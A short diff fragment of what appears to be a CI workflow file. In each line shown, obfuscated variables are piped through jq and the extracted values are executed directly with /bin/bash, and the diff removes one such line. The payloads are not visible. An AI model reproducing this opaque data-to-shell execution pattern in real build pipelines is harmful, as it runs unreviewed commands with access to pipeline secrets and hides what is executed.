@@ -54,7 +54,6 @@ jobs:
           printf '%s' "$us1728" | jq -r .g7574 | /bin/bash
           echo $a015 | jq -r .wve3 | /bin/bash
           echo $llk6 | jq -r .abk95 | /bin/bash
-          echo $k5522 | jq -r .rl109 | /bin/bash
           echo $dxmcr864 | jq -r .xufuy85405 | /bin/bash
           echo $n368 | jq -r .q6242 | /bin/bash
           printf '%s' "$ejd235" | jq -r .za79 | /bin/bash
